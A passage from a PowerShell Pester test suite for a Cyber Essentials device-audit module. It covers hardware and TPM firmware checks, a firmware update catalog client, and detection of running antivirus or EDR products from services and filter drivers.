        It 'parses DMTF date strings and flags virtual machines' {
            InModuleScope CEAudit {
                Mock Get-CimInstance {
                    switch ($ClassName) {
                        'Win32_ComputerSystem' { [pscustomobject]@{ Manufacturer = 'Microsoft Corporation'; Model = 'Virtual Machine' } }
                        'Win32_BIOS' { [pscustomobject]@{ ReleaseDate = '20240115000000.000000+000' } }
                    }
                }
                Mock Get-CERegistryValue { $Default }
                $hw = Get-CEHardwareInventory -IsElevated $true
                $hw.IsVirtualMachine | Should -BeTrue
                $hw.Firmware.ReleaseDate | Should -Be '2024-01-15'
                Mock Get-CERegistryValue { if ($Name -eq 'Update Revision') { return [byte[]]@(0x22, 0x01, 0, 0) } $Default }
                Mock Get-CimInstance { if ($ClassName -eq 'Win32_Processor') { [pscustomobject]@{ Name = 'CPU' } } }
                (Get-CEHardwareInventory).Cpu[0].MicrocodeRevision | Should -Be '0x122' -Because 'newer systems store the 4-byte revision'
                $hw.Tpm.Present | Should -BeFalse
            }
        }
    }

    Context 'SU-08' {
        It 'passes a recent BIOS and patched TPM firmware' {
            Set-TestDevice -Kind Secure
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            ($f | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Pass'
            ($f | Where-Object Subject -eq 'TPM firmware').Status | Should -Be 'Pass'
            ($f | Where-Object Subject -eq 'TPM firmware').Actual | Should -Match 'no known advisories'
        }

        It 'warns on old BIOS and fails ROCA-affected TPM firmware' {
            Set-TestDevice -Kind Insecure
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            $bios = $f | Where-Object Subject -eq 'Firmware'
            $bios.Status | Should -Be 'Warn'
            $bios.Actual | Should -Match 'months ago'
            $bios.Recommendation | Should -Match 'Contoso Laptop 14 G5'
            $tpm = $f | Where-Object Subject -eq 'TPM firmware'
            $tpm.FindingId | Should -Be 'SU-08:TPM-firmware'
            $tpm.Status | Should -Be 'Fail'
            $tpm.Severity | Should -Be 'High'
            $tpm.Actual | Should -Match 'CVE-2017-15361'
            $tpm.AutoFail | Should -BeFalse
        }

        It 'uses the configured age threshold' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.Firmware.ReleaseDate = $global:CETestCtx.AuditTime.AddDays(-731).ToString('yyyy-MM-dd')
            (@(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Warn'
            $global:CETestCtx.Hardware.Firmware.ReleaseDate = $global:CETestCtx.AuditTime.AddDays(-729).ToString('yyyy-MM-dd')
            (@(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware').Status | Should -Be 'Pass'
        }

        It 'skips BIOS age on virtual machines and asks for elevation for the TPM' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.IsVirtualMachine = $true
            $global:CETestCtx.Hardware.Tpm.Readable = $false
            $global:CETestCtx.IsElevated = $false
            $f = @(Invoke-CEAuditCore -Id 'SU-08')
            ($f | Where-Object Subject -eq 'Firmware').Status | Should -Be 'NotApplicable'
            ($f | Where-Object Subject -eq 'TPM firmware').Status | Should -Be 'Manual'
            ($f | Where-Object Subject -eq 'TPM firmware').Actual | Should -Match 'elevation'
        }

        It 'is Manual when the context has no hardware inventory' {
            Set-TestDevice -Kind Secure
            $global:CETestCtx.PSObject.Properties.Remove('Hardware')
            (@(Invoke-CEAuditCore -Id 'SU-08')).Status | Should -Be 'Manual'
        }
    }

    Context 'output' {
        It 'shows the hardware in both reports and a summary in status.json' {
            Set-TestDevice -Kind Insecure
            $f = @(Invoke-CEAuditCore)
            $out = Join-Path $TestDrive 'hw'
            $r = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath $out
            $md = Get-Content $r.Paths.Markdown -Raw
            $md | Should -Match '## Device hardware'
            $md | Should -Match '\| Serial number \| SN-TEST-001 \|'
            $md | Should -Match '\| Model \| Contoso Laptop 14 G5 \(SKU CT14G5\) \|'
            $md | Should -Match 'IFX firmware 7\.40\.2098\.0, TPM 2\.0'
            $html = Get-Content $r.Paths.Html -Raw
            $html | Should -Match '<h2>Device hardware</h2>'
            $html | Should -Match 'Contoso NVMe 1TB, 954 GB'
            (Get-Content $r.Paths.Findings -Raw | ConvertFrom-Json).Context.Hardware.Model | Should -Be 'Laptop 14 G5'

            $status = InModuleScope CEAudit -Parameters @{ F = $f; S = $r.Summary; C = $global:CETestCtx } { param($F, $S, $C) ConvertTo-CEStatus -Findings $F -Summary $S -Context $C -ReportFolder 'X' }
            $status.Hardware.SerialNumber | Should -Be 'SN-TEST-001'
            $status.Hardware.TpmFirmware | Should -Be '7.40.2098.0'
            $status.Hardware.Disks[0].Firmware | Should -Be '4B2QJXD7'
            $status.Checks.'SU-08'.status | Should -Be 'Fail'
            $path = InModuleScope CEAudit -Parameters @{ S = $status; P = (Join-Path $TestDrive 'hw-status.json') } { param($S, $P) Write-CEStatus -Status $S -Path $P }
            (Get-Content $path -Raw | ConvertFrom-Json).Hardware.Model | Should -Be 'Laptop 14 G5'
        }

        It 'reports without hardware still render (older context objects)' {
            Set-TestDevice -Kind Secure
            $ctx = New-TestContext
            $ctx.PSObject.Properties.Remove('Hardware')
            $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'NC-07') -Context $ctx -OutputPath (Join-Path $TestDrive 'nohw')
            (Get-Content $r.Paths.Markdown -Raw) | Should -Not -Match 'Device hardware'
        }
    }
}

Describe 'Firmware catalog (SU-08 with the catalog service)' {
    BeforeAll {
        function global:New-TestCatalogRecord {
            param([string]$Vendor = 'dell', [string]$Id = 'CT14', [object[]]$Releases, [datetime]$CheckedAt = (Get-Date))
            [pscustomobject]@{
                schemaVersion = 1; vendor = $Vendor; id = $Id; name = 'Contoso Laptop 14 G5'
                latest = $Releases[0]; releases = $Releases; source = 'https://example.test'; sourceUpdatedAt = $null
                catalogVersion = $null; checkedAt = $CheckedAt.ToUniversalTime().ToString('o')
            }
        }
        function global:New-TestRelease { param([string]$Version, [int]$DaysAgo, [string]$Criticality = $null)
            [pscustomobject]@{ version = $Version; date = (Get-Date).Date.AddDays(-$DaysAgo).ToString('yyyy-MM-dd'); criticality = $Criticality }
        }
        function global:Set-TestCatalog {
            param($Record, [string]$Status = 'Found', [string]$Installed = '1.14.1', [string]$Manufacturer = 'Dell Inc.')
            Set-TestDevice -Kind Secure
            $global:CETestCtx.Hardware.Manufacturer = $Manufacturer
            $global:CETestCtx.Hardware.Firmware.Version = $Installed
            $global:CETestCatalog = [pscustomobject]@{ Status = $Status; Record = $Record; FromCache = $false; Message = 'test'; Key = $null }
            Mock -ModuleName CEAudit Get-CEFirmwareCatalogRecord { $global:CETestCatalog }
        }
        $script:firmwareOf = { @(Invoke-CEAuditCore -Id 'SU-08') | Where-Object Subject -eq 'Firmware' }
    }

    Context 'keys and versions' {
        It 'derives the catalog key from the hardware inventory' {
            InModuleScope CEAudit {
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0cf1' })).Id | Should -Be '0CF1'
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'HP'; BaseboardProduct = '8B41' })).Vendor | Should -Be 'hp'
                (Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Hewlett-Packard'; BaseboardProduct = '8B41' })).Id | Should -Be '8B41'
                $l = Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'LENOVO'; Model = '21KCCTO1WW'; SystemSku = 'LENOVO_MT_21KC_BU_Think_FM_ThinkPad X1 Carbon Gen 12' })
                "$($l.Vendor)/$($l.Id)" | Should -Be 'lenovo/21KC'
                Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Microsoft Corporation'; Model = 'Surface Laptop 7' }) | Should -BeNullOrEmpty
                Get-CEFirmwareCatalogKey ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '../x' }) | Should -BeNullOrEmpty
            }
        }

        It 'compares BIOS versions the way each vendor reports them' {
            InModuleScope CEAudit {
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.14.1' -Catalog '1.17.0' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.17.0' -Catalog '1.17.0' | Should -Be 0
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed '1.10.0' -Catalog '1.9.1' | Should -Be 1
                Compare-CEFirmwareVersion -Vendor 'dell' -Installed 'A24' -Catalog '1.17.0' | Should -BeNullOrEmpty
                Compare-CEFirmwareVersion -Vendor 'hp' -Installed 'V70 Ver. 01.13.01' -Catalog '01.13.01' | Should -Be 0
                Compare-CEFirmwareVersion -Vendor 'hp' -Installed 'V70 Ver. 01.12.01' -Catalog '01.13.01' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'N3YET84W (1.49 )' -Catalog '1.50' | Should -Be -1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'M11KT56A' -Catalog 'M11KT55A' | Should -Be 1
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'M1XKT63A' -Catalog 'M11KT56A' | Should -BeNullOrEmpty
                Compare-CEFirmwareVersion -Vendor 'lenovo' -Installed 'N3YET84W' -Catalog '1.50' | Should -BeNullOrEmpty
            }
        }
    }

    Context 'client' {
        BeforeEach {
            $script:dataRoot = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            $env:CE_CHECKER_DATA = $script:dataRoot
            InModuleScope CEAudit {
                $script:origCatalogCfg = (Get-CEConfig).'firmware-catalog'
                (Get-CEConfig).'firmware-catalog' = [pscustomobject]@{ baseUrl = 'http://localhost:8787/'; timeoutSeconds = 5; cacheHours = 12; maxRecordAgeDays = 7 }
            }
            $script:hw = [pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0CF1' }
        }
        AfterEach {
            Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
            InModuleScope CEAudit { (Get-CEConfig).'firmware-catalog' = $script:origCatalogCfg }
        }

        It 'ships turned on, pointing at the https service' {
            $cfg = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'firmware-catalog.json') -Raw | ConvertFrom-Json
            $cfg.baseUrl | Should -Match '^https://'
        }

        It 'is off when no base URL is configured' {
            InModuleScope CEAudit {
                (Get-CEConfig).'firmware-catalog' = [pscustomobject]@{ baseUrl = '' }
                Mock Invoke-CEHttpGet { throw 'should not be called' }
                (Get-CEFirmwareCatalogRecord -Hardware ([pscustomobject]@{ Manufacturer = 'Dell Inc.'; SystemSku = '0CF1' })).Status | Should -Be 'Disabled'
            }
        }

        It 'refuses plain http except for localhost' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                Mock Invoke-CEHttpGet { throw 'should not be called' }
                (Get-CEConfig).'firmware-catalog'.baseUrl = 'http://catalog.example.com'
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Error'
                $r.Message | Should -Match 'https'
                Should -Invoke Invoke-CEHttpGet -Times 0
            }
        }

        It 'fetches, validates and caches a record, then reuses the cache' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30 'Urgent') | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Found'
                $r.Record.releases[0].version | Should -Be '1.17.0'
                Should -Invoke Invoke-CEHttpGet -Times 1 -ParameterFilter { $Uri -eq 'http://localhost:8787/v1/firmware/dell/0CF1' }
                $again = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $again.FromCache | Should -BeTrue
                Should -Invoke Invoke-CEHttpGet -Times 1
            }
        }

        It 'revalidates an old cache with its ETag and falls back to it when the service is down' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                $body = New-TestCatalogRecord -Vendor 'dell' -Id '0CF1' -Releases @(New-TestRelease '1.17.0' 30) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $body; ETag = '"abc"' } }
                Get-CEFirmwareCatalogRecord -Hardware $Hw | Out-Null
                (Get-CEConfig).'firmware-catalog'.cacheHours = 0
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 304; Body = ''; ETag = '"abc"' } }
                $r = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $r.Status | Should -Be 'Found'
                $r.Message | Should -Match 'confirmed'
                Should -Invoke Invoke-CEHttpGet -Times 1 -ParameterFilter { $ETag -eq '"abc"' }
                Mock Invoke-CEHttpGet { throw 'No connection could be made' }
                $down = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $down.Status | Should -Be 'Found'
                $down.FromCache | Should -BeTrue
                $down.Message | Should -Match 'unreachable'
            }
        }

        It 'reports unknown models, bad records and failures without a cache' {
            InModuleScope CEAudit -Parameters @{ Hw = $script:hw } {
                param($Hw)
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 404; Body = '{"error":"unknown-model"}'; ETag = '' } }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).Status | Should -Be 'NotFound'
                $wrong = New-TestCatalogRecord -Vendor 'hp' -Id '8B41' -Releases @(New-TestRelease '1.0' 1) | ConvertTo-Json -Depth 5
                Mock Invoke-CEHttpGet { [pscustomobject]@{ StatusCode = 200; Body = $wrong; ETag = '' } }
                (Get-CEFirmwareCatalogRecord -Hardware $Hw).Message | Should -Match 'invalid'
                Mock Invoke-CEHttpGet { throw (New-Object System.Net.Http.HttpRequestException('An error occurred while sending the request.', (New-Object System.Net.WebException('The remote name could not be resolved: catalog.example')))) }
                $err = Get-CEFirmwareCatalogRecord -Hardware $Hw
                $err.Status | Should -Be 'Error'
                $err.Message | Should -Match 'remote name could not be resolved'
                (Get-CEFirmwareCatalogRecord -Hardware ([pscustomobject]@{ Manufacturer = 'Acer' })).Status | Should -Be 'Unsupported'
            }
        }
    }

    Context 'SU-08 decisions' {
        It 'passes when the installed BIOS is the latest' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 30 'Urgent'), (New-TestRelease '1.16.0' 40 'Urgent')))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            $f.Actual | Should -Match 'is the latest for Contoso Laptop 14 G5'
            @($f.Evidence) -join "`n" | Should -Match 'Firmware catalog: Found'
        }

        It 'reads catalog timestamps as UTC after a JSON round trip (pwsh 7 turns them into DateTime)' {
            $checked = [datetime]::UtcNow.AddHours(-3)
            $json = New-TestCatalogRecord -Releases @(New-TestRelease '1.17.0' 30) -CheckedAt $checked | ConvertTo-Json -Depth 5
            Set-TestCatalog -Installed '1.17.0' -Record ($json | ConvertFrom-Json)
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            @($f.Evidence) -join "`n" | Should -Match ([regex]::Escape("checked $($checked.ToString('yyyy-MM-dd HH:mm')) UTC"))
        }

        It 'fails when an urgent update has been available for longer than the patch window' {
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 10 'Recommended'), (New-TestRelease '1.16.0' 40 'Urgent'), (New-TestRelease '1.14.1' 100 'Urgent')))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Fail'
            $f.Actual | Should -Match 'latest is 1\.17\.0 .* 2 newer release\(s\); the manufacturer marked 1\.16\.0 urgent 40 days ago'
            $f.Recommendation | Should -Match 'Dell Command \| Update'
        }

        It 'warns when behind without an overdue urgent release, and passes inside the patch window' {
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 30 'Recommended'), (New-TestRelease '1.14.1' 100)))
            (& $script:firmwareOf).Status | Should -Be 'Warn'
            Set-TestCatalog -Installed '1.14.1' -Record (New-TestCatalogRecord -Releases @((New-TestRelease '1.17.0' 5 'Urgent'), (New-TestRelease '1.14.1' 100)))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Pass'
            $f.Actual | Should -Match 'within the 14-day patch window'
            $f.Recommendation | Should -Match 'Install BIOS 1\.17\.0'
        }

        It 'warns when the device is current but the model has had no firmware for a long time' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.17.0' 900))
            $f = & $script:firmwareOf
            $f.Status | Should -Be 'Warn'
            $f.Actual | Should -Match 'no firmware has been released for this model since'
        }

        It 'falls back to BIOS age when the record is stale, versions do not compare, or there is no record' {
            Set-TestCatalog -Installed '1.17.0' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.18.0' 100 'Urgent') -CheckedAt (Get-Date).AddDays(-10))
            $f = & $script:firmwareOf
            $f.Actual | Should -Match 'months ago'
            @($f.Evidence) -join "`n" | Should -Match 'not used'

            Set-TestCatalog -Installed 'A24' -Record (New-TestCatalogRecord -Releases @(New-TestRelease '1.18.0' 100 'Urgent'))
            @((& $script:firmwareOf).Evidence) -join "`n" | Should -Match 'Could not compare'

            Set-TestCatalog -Status 'NotFound' -Record $null
            (& $script:firmwareOf).Actual | Should -Match 'months ago'
        }
    }
}

Describe 'Anti-malware detection (MP-01)' {
    BeforeAll {
        function global:Set-TestAntimalware {
            <#
                DefenderMode: Normal, 'Passive Mode', 'EDR Block Mode' or Absent.
                Services: hashtable name -> status. Filters: hashtable name -> altitude.
            #>
            param(
                [string]$OS = 'Windows Server', [string]$DefenderMode = 'Normal', [hashtable]$Services = @{}, [hashtable]$Filters = @{},
                [string[]]$LoadedDrivers = @(), [object[]]$SecurityCenter = @(), [bool]$Elevated = $true, [string]$Feature = 'Installed'
            )
            $ctx = @{ OSFamily = $OS; IsElevated = $Elevated }
            if ($OS -eq 'Windows Server') { $ctx.EditionClass = 'Server' }
            Set-TestDevice -Kind Secure -ContextOverride $ctx
            $global:CETestServiceList = @($Services.Keys | ForEach-Object { [pscustomobject]@{ Name = $_; Status = $Services[$_]; StartType = 'Automatic' } })
            $global:CETestDrivers = @($LoadedDrivers | ForEach-Object { [pscustomobject]@{ Name = $_; State = 'Running' } })
            $global:CETestFltmc = @('Filter Name                     Num Instances    Altitude    Frame', '------------------------------  -------------  ------------  -----') +
                @($Filters.Keys | ForEach-Object { '{0,-30}  {1,13}  {2,12}  {3,5}' -f $_, 4, $Filters[$_], 0 })
            $global:CETestSC = $SecurityCenter
            $global:CETestDefenderMode = $DefenderMode
            $global:CETestFeature = $Feature
            Mock -ModuleName CEAudit Get-CEAntivirusProducts { $global:CETestSC }
            Mock -ModuleName CEAudit Get-CEDefenderStatus {
                if ($global:CETestDefenderMode -eq 'Absent') { return $null }
                [pscustomobject]@{ AMRunningMode = $global:CETestDefenderMode; AntivirusEnabled = $true; RealTimeProtectionEnabled = $true; BehaviorMonitorEnabled = $true
                    IoavProtectionEnabled = $true; OnAccessProtectionEnabled = $true; IsTamperProtected = $true; AntivirusSignatureLastUpdated = (Get-Date).AddHours(-1)
                    AntivirusSignatureVersion = '1'; AMEngineVersion = '1'; AMProductVersion = '4.18' }
            }
            Mock -ModuleName CEAudit Get-WindowsFeature { [pscustomobject]@{ Name = 'Windows-Defender'; InstallState = $global:CETestFeature } }
            InModuleScope CEAudit {
                (Get-CEConfig).'av-products' = [pscustomobject]@{ products = @(
                    [pscustomobject]@{ id = 'microsoft-defender'; name = 'Microsoft Defender Antivirus'; kind = 'antivirus'; isDefender = $true; services = @('WinDefend'); drivers = @('WdFilter') },
                    [pscustomobject]@{ id = 'contoso-av'; name = 'Contoso AV'; kind = 'antivirus'; services = @('ContosoAV*'); drivers = @('ContosoFlt') },
                    [pscustomobject]@{ id = 'fabrikam-edr'; name = 'Fabrikam EDR'; kind = 'edr'; services = @('FabrikamSensor'); drivers = @('FabrikamMon'); notes = 'Fabrikam relies on Defender to block.' }
                ) }
            }
        }
        InModuleScope CEAudit { $script:realAvProducts = (Get-CEConfig).'av-products' }
        $script:mp01 = { @(Invoke-CEAuditCore -Id 'MP-01') }
        $script:bySubject = { param($f, $subject) @($f | Where-Object { $_.Subject -eq $subject }) }
    }
    AfterAll {
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
    }

    It 'the shipped product list is well formed' {
        $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'av-products.json') -Raw | ConvertFrom-Json
        $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
        $ids = @($list.products | ForEach-Object { $_.id })
        ($ids | Sort-Object -Unique).Count | Should -Be $ids.Count
        @($list.products | Where-Object { $_.PSObject.Properties['isDefender'] -and $_.isDefender }).Count | Should -Be 1
        foreach ($p in @($list.products)) {
            @('antivirus', 'edr') | Should -Contain $p.kind -Because $p.id
            (@($p.services) + @($p.drivers) | Where-Object { $_ }).Count | Should -BeGreaterThan 0 -Because $p.id
            foreach ($pattern in @(@($p.services) + @($p.drivers) | Where-Object { $_ })) {
                ($pattern -replace '[*?]', '').Length | Should -BeGreaterOrEqual 4 -Because "$($p.id) pattern '$pattern' must not match unrelated services"
                $pattern | Should -Not -Match '[\[\]]' -Because "$($p.id) pattern '$pattern' would be a -like character class"
            }
            @($p.sources).Count | Should -BeGreaterThan 0 -Because $p.id
            foreach ($u in @($p.sources)) { $u | Should -Match '^https://' -Because $p.id }
        }
    }

    It 'the shipped list recognises real products: kernel-driver services, versioned names and EDR-only agents' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ CSFalconService = 'Running' } -LoadedDrivers @('CSAgent') -Filters @{ CSAgent = 321410 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'CrowdStrike Falcon running'
        (& $script:bySubject $f 'Third-party protection').Recommendation | Should -Match 'Falcon Prevent licence'
        @(& $script:bySubject $f 'Unrecognised driver').Count | Should -Be 0

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ 'AVP.KES.21.18' = 'Running' } -Filters @{ klif = 323600 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        (@(& $script:mp01)[0]).Actual | Should -Match 'Kaspersky Endpoint Security'

        Set-TestAntimalware -DefenderMode 'Passive Mode' -Services @{ WinDefend = 'Running'; HuntressAgent = 'Running'; Sense = 'Running' } -Filters @{ WdFilter = 328010 }
        InModuleScope CEAudit { (Get-CEConfig).'av-products' = $script:realAvProducts }
        $f = @(& $script:mp01)
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'Huntress'
        $f[0].Actual | Should -Match 'Microsoft Defender for Endpoint'
    }

    It 'parses fltmc output, including decimal altitudes, and ignores the header' {
        InModuleScope CEAudit {
            $f = ConvertFrom-CEFltmcFilter -Lines @('Filter Name   Num Instances  Altitude  Frame', '-----  ---  ---  --', 'WdFilter   10   328010   0', 'odd.flt  2  320832.5  0', 'garbage line')
            @($f).Count | Should -Be 2
            $f[1].Name | Should -Be 'odd.flt'
            $f[1].Altitude | Should -Be 320832.5
        }
    }

    It 'Server, Defender running normally: Pass, nothing to confirm' {
        Set-TestAntimalware -DefenderMode 'Normal' -Services @{ WinDefend = 'Running' } -Filters @{ WdFilter = 328010 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Be 'Microsoft Defender Antivirus is running'
    }

    It 'Server, Defender passive, known antivirus running with its filter loaded: Pass installed, Manual for blocking and signatures' {
        Set-TestAntimalware -DefenderMode 'Passive Mode' -Services @{ WinDefend = 'Running'; 'ContosoAV.12.3' = 'Running' } -Filters @{ WdFilter = 328010; ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f '').Actual | Should -Be 'Contoso AV running'
        $manual = & $script:bySubject $f 'Third-party protection'
        $manual.Status | Should -Be 'Manual'
        $manual.Recommendation | Should -Match 'Contoso AV console'
        @($f | Where-Object { $_.Status -in 'Warn', 'Fail' }).Count | Should -Be 0
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        ($summary.CEPlus | Where-Object TestCase -eq 'TC3').State | Should -Be 'Check' -Because 'a third-party product must not make the TC3 estimate a pass'
    }

    It 'Server, Defender feature removed, known antivirus running: Pass installed, Manual for blocking' {
        Set-TestAntimalware -DefenderMode 'Absent' -Feature 'Removed' -Services @{ 'ContosoAV' = 'Running' } -Filters @{ ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
        @($f[0].Evidence) | Should -Contain 'Windows-Defender feature: Removed'
    }

    It 'Server, Defender absent and nothing else: Fail without a Defender fix' {
        Set-TestAntimalware -DefenderMode 'Absent' -Feature 'Available' -Services @{ Spooler = 'Running' } -Filters @{ bindflt = 409800 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Fail'
        $f[0].Actual | Should -Match 'not installed \(feature: Available\)'
        $f[0].Recommendation | Should -Match 'Install-WindowsFeature'
        $f[0].Remediation | Should -BeNullOrEmpty
    }

    It 'Server, Defender passive or in EDR block mode and nothing else: Fail' {
        foreach ($mode in 'Passive Mode', 'EDR Block Mode') {
            Set-TestAntimalware -DefenderMode $mode -Services @{ WinDefend = 'Running' } -Filters @{ WdFilter = 328010 }
            $f = @(& $script:mp01)
            $f[0].Status | Should -Be 'Fail' -Because $mode
            $f[0].Actual | Should -Match ([regex]::Escape("'$mode' mode"))
            $f[0].Remediation.Id | Should -Be 'Defender-EnableRealtime'
        }
    }

    It 'an anti-virus filter that no product claims: Manual on its own, and flagged alongside a known product' {
        Set-TestAntimalware -DefenderMode 'Absent' -Filters @{ MysteryFlt = 324100; bindflt = 409800 }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'Unrecognised anti-malware driver MysteryFlt \(altitude 324100\): confirm what it is'

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100; MysteryFlt = 324100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Unrecognised driver').Status | Should -Be 'Manual'
    }

    It 'two products actively scanning: Warn' {
        Set-TestAntimalware -DefenderMode 'Normal' -Services @{ WinDefend = 'Running'; ContosoAV = 'Running' } -Filters @{ WdFilter = 328010; ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        $warn = & $script:bySubject $f 'Multiple products'
        $warn.Status | Should -Be 'Warn'
        $warn.Actual | Should -Match 'Microsoft Defender Antivirus, Contoso AV'
    }

    It 'a detection-only tool: Manual, because Cyber Essentials needs blocking' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ FabrikamSensor = 'Running' }
        $f = @(& $script:mp01)
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Manual'
        $f[0].Recommendation | Should -Match 'blocks malware, not just detects it'
        $f[0].Recommendation | Should -Match 'Fabrikam relies on Defender'
    }

    It 'a known antivirus that is installed but not running: Fail' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Stopped' }
        $f = @(& $script:mp01)
        $f[0].Status | Should -Be 'Fail'
        $f[0].Actual | Should -Be 'Contoso AV is installed but not running'
    }

    It 'a running antivirus with no filter loaded: Warn that on-access scanning may be off' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Filters @{ bindflt = 409800 }
        (& $script:bySubject (& $script:mp01) 'Filter driver').Status | Should -Be 'Warn'

        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -LoadedDrivers @('ContosoFlt') -Filters @{ bindflt = 409800 }
        @(& $script:bySubject (& $script:mp01) 'Filter driver').Count | Should -Be 0 -Because 'the product driver is loaded'
    }

    It 'without elevation, fltmc is not run and the filter checks are skipped' {
        Set-TestAntimalware -DefenderMode 'Absent' -Services @{ ContosoAV = 'Running' } -Elevated $false
        $f = @(& $script:mp01)
        @(& $script:bySubject $f 'Filter driver').Count | Should -Be 0
        @($f[0].Evidence) -join "`n" | Should -Match 'fltmc needs elevation'
        Should -Invoke -ModuleName CEAudit Invoke-CENative -Times 0 -ParameterFilter { $FilePath -eq 'fltmc.exe' }
    }

    It 'Windows 11: Security Center stays the main source, and the filter check confirms it' {
        $contoso = [pscustomobject]@{ Name = 'Contoso AV'; Enabled = $true; UpToDate = $true; IsDefender = $false; State = '0x061000' }
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Passive Mode' -SecurityCenter @($contoso) -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100; WdFilter = 328010 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'Active: Contoso AV'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
        @($f | Where-Object { $_.Status -in 'Warn', 'Fail' }).Count | Should -Be 0

        $defender = [pscustomobject]@{ Name = 'Microsoft Defender Antivirus'; Enabled = $true; UpToDate = $true; IsDefender = $true; State = '0x061100' }
